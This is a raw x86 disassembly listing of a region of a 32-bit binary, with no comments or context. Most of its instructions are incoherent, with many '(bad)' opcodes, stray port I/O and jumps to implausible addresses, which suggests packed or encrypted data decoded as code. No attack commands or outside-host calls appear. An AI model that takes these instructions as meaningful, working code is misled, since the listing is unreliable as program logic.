  4124fa:	in     al,dx
  4124fb:	pop    eax
  4124fc:	repz shl DWORD PTR [edi+0x41],cl
  412500:	add    eax,edx
  412502:	cmp    edi,DWORD PTR [edi-0x30]
  412505:	sti    
  412506:	or     DWORD PTR [ecx+eiz*8-0x4813247e],ebp
  41250d:	popf   
  41250e:	aas    
  41250f:	cli    
  412510:	(bad)  
  412511:	addr16 mov bh,0x41
  412514:	mov    ?,WORD PTR [edx+0x6237695f]
  41251a:	mov    ds:0xb8e48b56,eax
  41251f:	xchg   DWORD PTR [ebp-0x74bc42b8],ebp
  412525:	in     eax,dx
  412526:	gs pop esp
  412528:	xchg   ebp,eax
  412529:	xor    BYTE PTR [esi-0x49],bh
  41252c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41252d:	int3   
  41252e:	retf   
  41252f:	pop    ds
  412530:	lds    edi,FWORD PTR [ecx-0xc]
  412533:	mov    ah,0x5e
  412535:	fcmovu st,st(3)
  412537:	sub    al,0xb7
  412539:	adc    BYTE PTR [ebp-0x1ec44796],dl
  41253f:	jb     0x412579
  412541:	scas   eax,DWORD PTR es:[edi]
  412542:	pop    ecx
  412543:	repz into 
  412545:	add    DWORD PTR [edx-0x29],esi
  412548:	fwait
  412549:	sbb    cl,BYTE PTR [edi+edi*1+0x38]
  41254d:	dec    ebx
  41254e:	mov    dl,0xed
  412550:	(bad)  
  412551:	jmp    0x41253a
  412553:	cmp    eax,0x298d4844
  412558:	add    eax,0x535d99b6
  41255d:	jg     0x4125d6
  41255f:	mov    ds:0xd5c4f786,al
  412564:	or     BYTE PTR [ebx+eax*4-0x7b5c034f],al
  41256b:	or     cl,ch
  41256d:	cmp    eax,0xcacd1a25
  412572:	mov    WORD PTR [eax+0x15],?
  412575:	jbe    0x412577
  412577:	mov    ah,0xb6
  412579:	les    eax,FWORD PTR [edx]
  41257b:	addr16 leave 
  41257d:	sbb    BYTE PTR [esi],al
  41257f:	push   cs
  412580:	jmp    0xd8aedc32
  412585:	ins    DWORD PTR es:[edi],dx
  412586:	mov    DWORD PTR [edx-0x37],esi
  412589:	shl    BYTE PTR [ebx+eax*1],0x65
  41258d:	mov    al,0xa4
  41258f:	in     eax,dx
  412590:	iret   
  412591:	jbe    0x412525
  412593:	or     edi,DWORD PTR [esi+ebx*8-0x1903043]
  41259a:	add    edx,DWORD PTR [ebp+0x1e]
  41259d:	(bad)  
  41259e:	mov    al,0x45
  4125a0:	sub    DWORD PTR [edx+0x16866190],edx
  4125a6:	call   0xbb6c1e8a
  4125ab:	pop    edi
  4125ac:	stc    
  4125ad:	or     ebx,ebp
  4125af:	icebp  
  4125b0:	jno    0x41253a
  4125b2:	daa    
  4125b3:	sbb    al,0x1b
  4125b5:	jmp    0xfa6d0de1
  4125ba:	neg    ecx
  4125bc:	cmp    cl,cl
  4125be:	push   eax
  4125bf:	push   edi
  4125c0:	inc    edi
  4125c1:	out    dx,eax
  4125c2:	sub    DWORD PTR [edi],0xffffffd4
  4125c5:	popa   
  4125c6:	test   DWORD PTR [ecx+edi*8+0x67],esi
  4125ca:	mov    bh,0xc9
  4125cc:	mov    ecx,DWORD PTR [ebx-0x6a3bc3c6]
  4125d2:	xchg   esp,eax
  4125d3:	ror    BYTE PTR [ecx-0x55d66b7],cl
  4125d9:	mov    edi,0x419df419
  4125de:	in     al,0x72
  4125e0:	fisub  WORD PTR [edx-0x41b60cae]
  4125e6:	pop    eax
  4125e7:	add    al,0xef
  4125e9:	jg     0x41264b
  4125eb:	dec    esp
  4125ec:	inc    esi
  4125ed:	rcl    DWORD PTR [edx+ebx*4],0x23
  4125f1:	and    al,0x78
  4125f3:	push   0x13c53ccf
  4125f8:	sub    BYTE PTR [esi-0x4a7dbf12],ah
  4125fe:	stc    
  4125ff:	and    BYTE PTR [esi-0xf],dh
  412602:	inc    edi
  412603:	aas    
  412604:	inc    ebp
  412605:	cwde   
  412606:	mov    dh,0x9b
  412608:	das    
  412609:	sti    
  41260a:	and    al,0x22
  41260d:	test   BYTE PTR [eax],0xce
  412610:	push   edi
  412611:	xor    BYTE PTR [ecx],0xb
  412614:	push   ebx
  412615:	or     al,0xe9
  412617:	out    dx,al
  412618:	repnz or al,0xd1
  41261b:	xchg   ebx,eax
  41261c:	push   eax
  41261d:	and    al,0x49
  41261f:	sbb    al,0x3
  412621:	push   ds
  412622:	aad    0x6e
  412624:	iret   
  412625:	mov    esp,0xd2dbf1f1
  41262a:	cmp    al,0x73
  41262c:	(bad)  
  41262d:	dec    ebp
  41262e:	mov    WORD PTR [ebx],ds
  412630:	popa   
  412631:	jge    0x4125f3
  412633:	pop    eax
  412634:	pop    esp
  412635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412636:	mov    edi,0x996d0f5f
  41263b:	xchg   ebx,eax
  41263c:	stos   BYTE PTR es:[edi],al
  41263d:	scas   al,BYTE PTR es:[edi]
  41263e:	xchg   BYTE PTR [esi-0x7a],bh
  412641:	dec    esi
  412642:	aad    0x20
  412644:	xchg   edx,eax
  412645:	pop    edx
  412646:	retf   
  412647:	mov    eax,0x61adb207
  41264c:	outs   dx,BYTE PTR ds:[esi]
  41264d:	jno    0x4126a4
  41264f:	inc    ecx
  412650:	(bad)  
  412651:	push   ds
  412652:	pop    ecx
  412653:	jns    0x4125f0
  412655:	mov    eax,0xa67ba22e
  41265a:	push   0x27d36b98
  41265f:	xchg   ecx,eax
  412660:	xor    al,0xd8
  412662:	jmp    0x9391c87d
  412667:	mul    DWORD PTR [esi-0x2bcf7d8f]
  41266d:	cli    
  41266e:	sbb    eax,0xbd8f1da9
  412673:	inc    edi
  412674:	retf   
  412675:	shl    BYTE PTR [edi-0x510dfccc],cl
  41267b:	pop    ecx
  41267c:	dec    edx
  41267d:	sub    di,dx
  412680:	gs mov edx,0xa9f3faca
  412686:	cdq    
  412687:	push   ebp
  412688:	mov    ebp,0x8c830d19
  41268d:	and    DWORD PTR [eax],eax
  41268f:	and    ah,BYTE PTR [eax+0xd29ec18]
  412695:	jg     0x412659
  412697:	push   eax
  412698:	jae    0x412668
  41269a:	idiv   DWORD PTR [ebx]
  41269c:	and    al,0xf1
  41269e:	(bad)  
  41269f:	retf   0x7c97
  4126a2:	(bad)  
  4126a3:	jg     0x412705
  4126a5:	or     eax,0xdbd2f23e
  4126aa:	and    BYTE PTR [edi],ch
  4126ac:	cmp    DWORD PTR [edx+0x712c4575],0x89391048
  4126b6:	jl     0x4126f5
  4126b8:	sub    DWORD PTR [edx-0x675e31f],0x4b5abbb3
  4126c2:	mov    dh,0x42
  4126c4:	push   ebx
  4126c5:	das    
  4126c6:	pop    ecx
  4126c7:	test   al,0x75
  4126c9:	leave  
  4126ca:	out    0x59,al
  4126cc:	inc    ah
  4126ce:	xchg   esi,eax
  4126cf:	popa   
  4126d0:	cwde   
  4126d1:	lds    ebx,FWORD PTR [ebx-0x433039d2]
  4126d7:	xchg   esp,eax
  4126d8:	in     al,0x93
  4126da:	cmp    eax,0xe21e90c3
  4126df:	jae    0x412667
  4126e1:	add    DWORD PTR [ebp-0x29],esi
  4126e4:	and    al,0xcc
  4126e6:	mov    al,ds:0x7948c077
  4126eb:	int    0xf1
  4126ed:	cmp    ebx,DWORD PTR [edx+0x69]
  4126f0:	dec    di
  4126f2:	add    ah,BYTE PTR [eax]
  4126f4:	xlat   BYTE PTR ds:[ebx]
  4126f5:	xor    DWORD PTR [ebp+esi*8+0x76f356b3],ebp
  4126fc:	xor    DWORD PTR [esi],esi
  4126fe:	mov    dl,0xa3
  412700:	and    dl,BYTE PTR [esi+ebp*2]
  412703:	lahf   
  412704:	jo     0x4126b9
  412706:	cli    
  412707:	push   ebp
  412708:	cwde   
  412709:	xchg   BYTE PTR [edx*8-0x543828d1],ch
  412710:	fst    QWORD PTR [ebp-0x2c]
  412713:	test   DWORD PTR [ecx+0x75],ebp
  412716:	mov    dh,0xf2
  412718:	sub    BYTE PTR [ebx+0x78],ch
  41271b:	or     esp,DWORD PTR [edx]
  41271d:	dec    ebp
  41271e:	rcr    BYTE PTR [eiz*1+0x7a87086e],0xcd
  412726:	adc    ah,BYTE PTR ds:0xd0109bf5
  41272c:	fild   WORD PTR [eax-0x5e]
  41272f:	frstpm(287 only) 
  412731:	pop    ss
  412732:	sub    ah,BYTE PTR [edi]
  412734:	mov    DWORD PTR cs:[ebp-0xc],0xf89c8539
  41273c:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	sub    eax,0xaae769ef
  412759:	ins    BYTE PTR es:[edi],dx
  41275a:	js     0x4127d4
  41275c:	in     eax,0x7e
  41275e:	js     0x4127d8
  412760:	aad    0x9b
  412762:	ret    0xf151
  412765:	dec    ebx
  412766:	test   BYTE PTR [bp+di],0xef
  41276a:	add    al,0x2
  41276c:	ins    DWORD PTR es:[edi],dx
  41276d:	outs   dx,DWORD PTR ds:[esi]
  41276e:	push   ss
  41276f:	dec    edx
  412770:	(bad)  
  412771:	mov    ebx,0xf6d17677
  412776:	mov    esi,0x5c2c0d47
  41277b:	push   ecx
  41277c:	sahf   
  41277d:	or     al,0xee
  41277f:	adc    al,0xec
  412781:	pop    edx
  412782:	pop    es
  412783:	sub    ebp,DWORD PTR [edi]
  412785:	imul   ecx,DWORD PTR [edi+ebx*2+0x322855ac],0x4ab49cb0
  412790:	retf   0x8658
  412793:	sub    cl,ch
  412795:	(bad)  
  412796:	fwait
  412797:	stos   DWORD PTR es:[edi],eax
  412798:	mov    ah,0xe3
  41279a:	fidivr WORD PTR [eax+0x74d7e8bd]
  4127a0:	and    BYTE PTR [ebx+0x4f],ah
  4127a3:	pop    ebp
  4127a4:	jne    0x412758
  4127a6:	neg    BYTE PTR [esi+0x482a0fbd]
  4127ac:	aaa    
  4127ad:	pop    esp
  4127ae:	inc    eax
  4127af:	retf   0xba
  4127b2:	push   0xc23b9378
  4127b7:	(bad)
  4127bb:	mov    si,0x851
  4127bf:	push   esi
  4127c0:	lods   al,BYTE PTR es:[esi]
  4127c2:	jne    0x4127d7
  4127c4:	aaa    
  4127c5:	sbb    DWORD PTR [eax-0x7c],ebp
  4127c8:	pusha  
  4127c9:	ja     0x4127be
  4127cb:	sub    BYTE PTR [edx],0xe2
  4127ce:	adc    al,0xc8
  4127d0:	mov    edi,0x37f2b794
  4127d5:	(bad)  
  4127d6:	mov    ds:0x24fd089c,eax
  4127db:	inc    ecx
  4127dc:	xor    al,0xcd
  4127de:	icebp  
  4127df:	mov    ds:0x7734e1f0,eax
  4127e4:	dec    esp
  4127e5:	test   dl,bh
  4127e7:	hlt    
  4127e8:	in     eax,dx
  4127e9:	repz sub edi,DWORD PTR [edi-0x6db956c8]
  4127f0:	loopne 0x4127cc
  4127f2:	mov    fs,WORD PTR [edi-0x2b9793e1]
  4127f8:	xchg   esi,eax
  4127f9:	clc    
  4127fa:	outs   dx,BYTE PTR ds:[esi]
  4127fb:	xor    BYTE PTR ds:0xe95f6754,bh
  412801:	pop    ebx
  412802:	jns    0x4127b9
  412804:	dec    eax
  412805:	addr16 add bh,dh
  412808:	repnz retf 
  41280a:	push   edx
  41280b:	cmc    
  41280c:	dec    edx
  41280d:	test   eax,edi
  41280f:	xor    ebx,DWORD PTR [esi]
  412811:	and    al,0xb7
  412813:	popf   
  412814:	adc    edi,esp
  412816:	xchg   BYTE PTR [edx+0x5d852872],bh
  41281c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41281d:	inc    esp
  41281e:	jb     0x412819
  412820:	je     0x41286e
  412822:	bound  edi,QWORD PTR [edi+0x58]
  412825:	gs pushf 
  412827:	jo     0x4127d4
  412829:	inc    edi
  41282a:	cs sub BYTE PTR cs:[esp+edx*8+0x64],dh
  412830:	adc    dl,BYTE PTR [eax]
  412832:	or     DWORD PTR ds:0xa9f8a23d,0x5e
  412839:	mov    esi,0x41c3344
  41283e:	cmp    DWORD PTR [ecx-0x12dab72b],edi
  412844:	mov    ss,WORD PTR [edi]
  412846:	push   ebp
  412847:	sbb    ecx,DWORD PTR [eax+0x4b00c0b2]
  41284d:	call   0x3967:0x94dab8e0
  412854:	pop    ebp
  412855:	mov    DWORD PTR ds:0x785edda1,ebx
  41285b:	dec    esi
  41285c:	mov    ah,ah
  41285e:	inc    esi
  41285f:	mov    esi,0xe76d4d8b
  412864:	push   ss
  412865:	sbb    ecx,DWORD PTR [ebx-0xd]
  412868:	add    bl,cl
  41286a:	pop    ebp
  41286b:	dec    edi
  41286c:	aaa    
  41286d:	mov    ebp,edi
  41286f:	jecxz  0x412805
  412871:	push   es
  412872:	lock dec edi
  412874:	inc    ecx
  412875:	sbb    al,0xdb
  412877:	mov    cl,0x81
  412879:	retf   
  41287a:	test   al,0x3c
  41287c:	sbb    BYTE PTR [esi-0x43349275],ah
  412882:	jo     0x4128b7
  412884:	(bad)  
  412885:	jns    0x41282d
  412887:	outs   dx,BYTE PTR ds:[esi]
  412888:	daa    
  412889:	and    DWORD PTR [ebx+ecx*8],esp
  41288c:	inc    edx
  41288d:	xor    DWORD PTR [edi-0x77],eax
  412890:	cmp    DWORD PTR [ebx+0x41],edi
  412893:	int3   
  412894:	mov    eax,0x6d07be34
  412899:	test   BYTE PTR [edi+0x46a7e748],0x4
  4128a0:	inc    eax
  4128a1:	retf   0x53c6
  4128a4:	mov    WORD PTR ds:0xdbfafbf5,?
  4128aa:	mov    edx,0xba66d2a8
  4128af:	arpl   WORD PTR [eax],bx
  4128b1:	in     eax,0x80
  4128b3:	out    0xc2,eax
  4128b5:	ja     0x41285a
  4128b7:	fwait
  4128b8:	sub    BYTE PTR [ebx],0x7a
  4128bb:	aaa    
  4128bc:	int    0xcd
  4128be:	pop    esi
  4128bf:	xchg   ebx,eax
  4128c0:	fisubr DWORD PTR [esp+eiz*8]
  4128c3:	cmc    
  4128c4:	rcl    BYTE PTR [edx-0x29],cl
  4128c7:	xchg   esi,edi
  4128c9:	loopne 0x41291d
  4128cb:	imul   ebp,DWORD PTR [ebx+0x428f44],0xb72da1d6
  4128d5:	out    dx,al
  4128d6:	jnp    0x41293c
  4128d8:	xor    BYTE PTR [edx],0x94
  4128db:	popf   
  4128dc:	sub    ah,bl
  4128de:	sbb    ecx,DWORD PTR [ebx]
  4128e0:	push   esp
  4128e1:	jbe    0x4128b8
  4128e3:	or     al,0x87
  4128e5:	or     al,0xe8
  4128e7:	cmp    bl,BYTE PTR [ecx-0x44]
  4128ea:	call   0x28911b34
  4128ef:	xor    DWORD PTR [edx],edi
  4128f1:	sub    eax,0x7664000a
  4128f6:	push   edx
  4128f7:	jae    0x412914
  4128f9:	popf   
  4128fa:	pop    ebx
  4128fb:	or     DWORD PTR [ebx],ecx
  4128fd:	cs mov cs,ebx
  412900:	imul   eax,DWORD PTR [eax],0x1d
  412903:	inc    ecx
  412904:	or     ebx,esi
  412906:	sub    DWORD PTR [eax-0x79efc08],ebx
  41290c:	push   edx
  41290d:	rol    edx,0x75
  412910:	sub    dh,BYTE PTR [ebx-0x67]
  412913:	aad    0xa5
  412915:	xchg   esp,eax
  412916:	aas    
  412917:	addr16 loopne 0x4128a8
  41291a:	and    bl,BYTE PTR [ecx]
  41291c:	sub    edx,eax
  41291e:	mov    edi,0xaa2cade5
  412923:	push   ds
  412924:	js     0x4128c2
  412926:	lods   al,BYTE PTR ds:[esi]
  412927:	cdq    
  412928:	(bad)  
  412929:	jno    0x4128d2
  41292b:	add    dl,BYTE PTR [esi-0x5d40236c]
  412931:	int    0x3f
  412933:	mov    edi,0x378d0be0
  412938:	loope  0x412970
  41293a:	mov    esi,0xe1bb4881
  41293f:	mov    ch,0x7a
  412941:	jne    0x4128f8
  412943:	int3   
  412944:	fwait
  412945:	or     edx,DWORD PTR [eax]
  412947:	adc    cl,BYTE PTR [ecx]
  412949:	mov    edi,0x59611f31
  41294e:	iret   
  41294f:	pop    es
  412950:	int3   
  412951:	dec    edi
  412952:	xchg   esp,eax
  412953:	ror    edi,0x25
  412956:	pop    eax
  412957:	aad    0xa1
  412959:	(bad)  
  41295a:	sub    al,0x1c
  41295c:	pop    ss
  41295d:	mov    ah,0xdf
  41295f:	jae    0x412913
  412961:	in     eax,0xa
  412963:	loope  0x41298d
  412965:	loope  0x412936
  412967:	sbb    dl,0x7b
  41296a:	out    0x50,eax
  41296c:	and    eax,0xbe039c9c
  412971:	fist   DWORD PTR [ecx+0x29]
  412974:	mov    esp,0x30daab8d
  412979:	loop   0x4129c8
  41297b:	dec    ecx
  41297c:	mov    WORD PTR [edi-0x1f],es
  41297f:	int    0x3b
  412981:	cli    
  412982:	add    DWORD PTR [edx+0x67],0xffffff99
  412986:	cs cld 
  412988:	push   es
  412989:	cmp    dh,dh
  41298b:	push   ds
  41298c:	sbb    ebp,DWORD PTR [esi]
  41298e:	lods   eax,DWORD PTR ds:[esi]
  41298f:	ja     0x4129a3
  412991:	(bad)  
  412992:	(bad)  
  412993:	daa    
  412994:	mov    al,ds:0x62adc20d
  412999:	cmp    bl,BYTE PTR [esi+0x7e]
  41299c:	mov    eax,ds:0x59c3fe23
  4129a1:	mov    eax,0x30a2765b
  4129a6:	jl     0x412a21
  4129a8:	cs mov ebp,0x89a2560
  4129ae:	jmp    0xbf9b026b
  4129b3:	popa   
  4129b4:	jg     0x4129d3
  4129b6:	jge    0x412988
  4129b8:	(bad)  
  4129b9:	fxch   st(0)
  4129bb:	jo     0x41295b
  4129bd:	mov    ds:0xe49f0aaf,eax
  4129c2:	aas    
  4129c3:	xchg   esp,eax
  4129c4:	mov    eax,DWORD PTR [edx]
  4129c6:	imul   edx,DWORD PTR [ecx-0x74556443],0xd033e855
  4129d0:	add    edx,ecx
  4129d2:	jmp    0x41396f
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x412a51
  4129f1:	inc    edi
  4129f2:	mov    ah,0xce
  4129f4:	pop    ss
  4129f5:	jno    0x412a6f
  4129f7:	js     0x4129de
  4129f9:	jle    0x412a73
  4129fb:	js     0x412a4f
  4129fd:	xor    bh,BYTE PTR [edx-0x4f43d409]
  412a03:	sub    BYTE PTR [edx],bl
  412a05:	jp     0x4129f1
  412a07:	pop    esp
  412a08:	cmp    BYTE PTR [esp+ebp*1+0x764344a9],cl
  412a0f:	popf   
  412a10:	stos   BYTE PTR es:[edi],al
  412a11:	xor    al,0x7a
  412a13:	push   eax
  412a14:	cmc    
  412a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a16:	dec    edi
  412a17:	out    0x1f,al
  412a19:	push   ecx
  412a1a:	shl    BYTE PTR [ebx+0x63],0x59
  412a1e:	mov    esp,0xd0ef1499
  412a23:	lock sub bl,BYTE PTR [eax+0x3c89ea48]
  412a2a:	gs inc ecx
  412a2c:	mov    ebp,0xfbd2fec
  412a31:	mov    al,0x3a
  412a33:	push   ecx
  412a34:	out    0x59,al
  412a36:	imul   esp,DWORD PTR [edx+edi*4+0x4057ff76],0x4e
  412a3e:	dec    ebp
  412a3f:	cwde   
  412a40:	push   esp
  412a41:	inc    esp
  412a42:	adc    bh,BYTE PTR [ebp+0xb288653]
  412a48:	cmp    ebp,DWORD PTR [edx+0x42bbc081]
  412a4e:	cwde   
  412a4f:	pusha  
  412a50:	mov    ch,0xd8
  412a52:	pop    ebx
  412a53:	ins    DWORD PTR es:[edi],dx
  412a54:	call   0x4d5fe9
  412a59:	in     eax,0xae
  412a5b:	push   esi
  412a5c:	(bad)  
  412a5e:	fild   WORD PTR [esi]
  412a60:	sub    al,0x28
  412a62:	jg     0x412a58
  412a64:	sub    ah,0x93
  412a67:	imul   eax,edx,0x63
  412a6a:	cmp    BYTE PTR [ebp-0x54e87a1f],bl
  412a70:	mov    cl,bl
  412a72:	mov    ds:0x97e4b776,al
  412a77:	or     BYTE PTR [esi+esi*4+0x5d],cl
  412a7b:	inc    ecx
  412a7c:	mov    eax,ds:0xed5a32bc
  412a81:	test   DWORD PTR [ebp+0x6375493],ebx
  412a87:	push   cs
  412a88:	xor    ecx,DWORD PTR [edi+0x2b0d8b73]
  412a8e:	cdq    
  412a8f:	(bad)  
  412a90:	int    0x37
  412a92:	mov    eax,0x7a5e2a16
  412a97:	paddw  mm1,QWORD PTR [ebx]
  412a9a:	push   esp
  412a9b:	dec    esp
  412a9c:	mov    edx,0x4c5167d5
  412aa1:	pop    ebx
  412aa2:	scas   al,BYTE PTR es:[edi]
  412aa3:	pop    ebx
  412aa5:	shl    DWORD PTR [eax-0x3f931bef],1
  412aab:	lods   al,BYTE PTR ds:[esi]
  412aac:	arpl   WORD PTR [ecx-0x43],dx
  412aaf:	cmp    DWORD PTR [edi+0xacc164],esi
  412ab5:	and    eax,0x6eb1b9e8
  412aba:	repnz sbb edi,DWORD PTR [eax+ecx*4+0xfd607bb]
  412ac2:	daa    
  412ac3:	enter  0x723,0xb9
  412ac7:	add    DWORD PTR [esi],0xc
  412aca:	retf   0x6828
  412acd:	mov    edx,0x86300074
  412ad2:	add    al,0xfc
  412ad4:	mov    al,BYTE PTR [ecx+0x23]
  412ad7:	push   edx
  412ad8:	retf   
  412ad9:	out    dx,al
  412ada:	adc    cl,BYTE PTR [edi+0x3]
  412add:	push   ss
  412ade:	in     al,dx
  412adf:	outs   dx,BYTE PTR ds:[esi]
  412ae0:	pushf  
  412ae1:	mov    ebx,0xa322b6de
  412ae6:	xlat   BYTE PTR ds:[ebx]
  412ae7:	push   ds
  412ae8:	dec    eax
  412ae9:	mov    bh,0xfa
  412aeb:	fbstp  TBYTE PTR [esi]
  412aed:	pop    ebx
  412aee:	inc    BYTE PTR [esi]
  412af0:	adc    BYTE PTR ds:0xe9e6fa9d,dh
  412af6:	sbb    BYTE PTR [edx],dh
  412af8:	jg     0x412a80
  412afa:	sbb    al,0xe5
  412afc:	jae    0x412b32
  412afe:	inc    esp
  412aff:	push   esp
  412b00:	out    dx,eax
  412b01:	sbb    dl,BYTE PTR [eax]
  412b03:	or     al,0xb5
  412b05:	pop    es
  412b06:	add    DWORD PTR [esi],0xf43af51f
  412b0c:	mov    dl,0x6b
  412b0e:	or     BYTE PTR [ebp-0x55],ah
  412b11:	mov    edx,0x426ccaf8
  412b16:	pop    ss
  412b17:	cmp    ah,BYTE PTR [ebx-0x80]
  412b1a:	arpl   bx,dx
  412b1c:	inc    esp
  412b1d:	mov    eax,0xb939d38a
  412b22:	out    dx,al
  412b23:	jg     0x412aff
  412b25:	jg     0x412b85
  412b27:	daa    
  412b28:	push   ebx
  412b29:	or     al,0xed
  412b2b:	jl     0x412b25
  412b2d:	call   0x10aa:0x8b07acbc
  412b34:	data16 (bad) [edx-0x51203cbc]
  412b3b:	shl    DWORD PTR [edi+0x44],1
  412b3e:	mul    ebp
  412b40:	xchg   edx,eax
  412b41:	cmp    bh,dh
  412b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b44:	mov    ebp,0x7a7f4556
  412b49:	or     WORD PTR ds:0x817bf34b,bp
  412b50:	data16 int3 
  412b52:	pushf  
  412b53:	jne    0x412bc3
  412b55:	sar    BYTE PTR [eax],0x7f
  412b58:	or     DWORD PTR [edx-0x76],0xffffffee
  412b5c:	setno  dh
  412b5f:	or     al,0x74
  412b61:	xchg   ecx,esi
  412b63:	outs   dx,DWORD PTR ds:[esi]
  412b64:	clc    
  412b65:	(bad)  
  412b66:	jb     0x412bb7
  412b68:	mov    bh,0xdf
  412b6a:	add    DWORD PTR [ecx],eax
  412b6c:	jmp    0x66d9:0x1ba36ddb
  412b73:	hlt    
  412b74:	mov    dl,0xef
  412b76:	seta   BYTE PTR ds:0x5bc8900
  412b7d:	cmc    
  412b7e:	jnp    0x412bc7
  412b80:	dec    esi
  412b81:	es adc al,0x8a
  412b84:	inc    esi
  412b85:	jbe    0x412b63
  412b87:	scas   eax,DWORD PTR es:[edi]
  412b88:	sbb    al,0xb0
  412b8a:	xchg   ch,bl
  412b8c:	pop    esp
  412b8d:	cmc    
  412b8e:	por    mm0,mm6
  412b91:	jo     0x412b7e
  412b93:	add    eax,0xa1161095
  412b98:	fs add al,0x1
  412b9b:	cli    
  412b9c:	mov    eax,0x6faf37c0
  412ba1:	mov    eax,0x526c4ef1
  412ba6:	aam    0x55
  412ba8:	mov    edi,DWORD PTR [ebp-0x6c2f2af2]
  412bae:	je     0x412b39
  412bb0:	and    eax,0x959a593e
  412bb5:	adc    BYTE PTR [edi+0x6479c5d],ah
  412bbb:	in     al,0x95
  412bbd:	jb     0x412b79
  412bbf:	sbb    eax,0xf220c75c
  412bc4:	retf   0xdd6b
  412bc7:	rep outs dx,DWORD PTR ds:[esi]
  412bc9:	mov    ebp,0xcc0545ec
  412bce:	shl    DWORD PTR [ecx],cl
  412bd0:	cld    
  412bd1:	aam    0xe8
  412bd3:	retf   0x8345
  412bd6:	push   es
  412bd7:	pop    DWORD PTR [edi+0x5dfe754d]
  412bdd:	daa    
  412bde:	daa    
  412bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412be0:	pop    es
  412be1:	xor    DWORD PTR [esi+0x55a6176c],0x4f
  412be8:	xchg   esp,eax
  412be9:	mov    ecx,0xfbaffd51
  412bee:	jg     0x412c1e
  412bf0:	jo     0x412c45
  412bf2:	call   0xa7ff:0x69d486d7
  412bf9:	add    eax,0x1e374ef
  412bfe:	pop    ds
  412bff:	in     al,dx
  412c00:	and    DWORD PTR [edx+eiz*4],esp
  412c03:	call   FWORD PTR [eax]
  412c05:	or     eax,DWORD PTR [ecx+0x6429ce15]
  412c0b:	inc    edi
  412c0c:	and    ch,BYTE PTR es:[edi+0x6c8867f6]
  412c13:	lds    esi,FWORD PTR [esi+0x3316a8eb]
  412c19:	iret   
  412c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c1b:	hlt    
  412c1c:	mov    DWORD PTR [edx+0x1e],ecx
  412c1f:	dec    edi
  412c20:	enter  0xad54,0x6e
  412c24:	sar    BYTE PTR [edi+0x52be3199],cl
  412c2a:	retf   0xc147
  412c2d:	cmc    
  412c2e:	sar    dl,1
  412c30:	(bad)  
  412c31:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c33:	aaa    
  412c34:	jmp    0xf8448d86
  412c39:	loopne 0x412bd6
  412c3b:	jg     0x412c27
  412c3d:	cmp    al,0x94
  412c3f:	xor    esp,ebx
  412c41:	rcl    BYTE PTR [ecx-0x75],cl
  412c44:	mov    edx,0xd85eeb61
  412c49:	xor    dh,BYTE PTR [ecx-0x78]
  412c4c:	retf   0x2727
  412c4f:	ins    BYTE PTR es:[edi],dx
  412c50:	dec    eax
  412c51:	(bad)  
  412c53:	xchg   edx,eax
  412c54:	cwde   
  412c55:	and    al,0x74
  412c57:	add    al,0x15
  412c59:	mov    al,ds:0x52615819
  412c5e:	jb     0x412be3
  412c60:	out    0x38,eax
  412c62:	push   cs
  412c63:	mov    esi,0x8be7471a
  412c68:	jge    0x412c4e
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [ecx-0x3029fc1],eax
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412c36
  412c8f:	adc    esi,edi
  412c91:	leave  
  412c92:	pop    esp
  412c93:	lds    ecx,FWORD PTR [ebp-0x7d]
  412c96:	jp     0x412cf2
  412c98:	cmp    dl,bl
  412c9a:	jns    0x412c7a
  412c9c:	mov    al,ds:0x77e2b6f6
  412ca1:	cmc    
  412ca2:	jb     0x412c86
  412ca4:	adc    esi,ebp
  412ca6:	sbb    eax,DWORD PTR [eax+0x36]
  412ca9:	push   0x25f7ab64
  412cae:	js     0x412cb5
  412cb0:	cmp    BYTE PTR [ebx-0x2025b274],ah
  412cb6:	out    0x1f,eax
  412cb8:	dec    eax
  412cb9:	out    dx,eax
  412cba:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  412cbc:	(bad)  
  412cbd:	clc    
  412cbe:	js     0x412c76
  412cc0:	fcom   DWORD PTR [eax]
  412cc2:	jb     0x412c44
  412cc4:	clc    
  412cc5:	cdq    
  412cc6:	imul   ebp,DWORD PTR [ebx+0x2c],0x4d
  412cca:	dec    esp
  412ccb:	inc    ebx
  412ccc:	push   edx
  412ccd:	inc    esp
  412cce:	xor    eax,0xb4ea608
  412cd3:	cdq    
  412cd4:	jl     0x412cb2
  412cd6:	pop    eax
  412cd7:	xchg   ecx,eax
  412cd8:	adc    BYTE PTR [edi+eiz*2+0x47],ch
  412cdc:	xlat   BYTE PTR ds:[ebx]
  412cdd:	popf   
  412cde:	pop    ss
  412cdf:	int    0x63
  412ce1:	and    BYTE PTR [ecx+0x50d34f01],ah
  412ce7:	cmp    ebp,DWORD PTR [ebx]
  412ce9:	stc    
  412cea:	scas   eax,DWORD PTR es:[edi]
  412ceb:	sbb    BYTE PTR [ebp+0x79],ch
  412cee:	xchg   ebp,eax
  412cef:	es (bad) 
  412cf1:	jns    0x412cc2
  412cf3:	lods   al,BYTE PTR ds:[esi]
  412cf4:	inc    edi
  412cf5:	push   edx
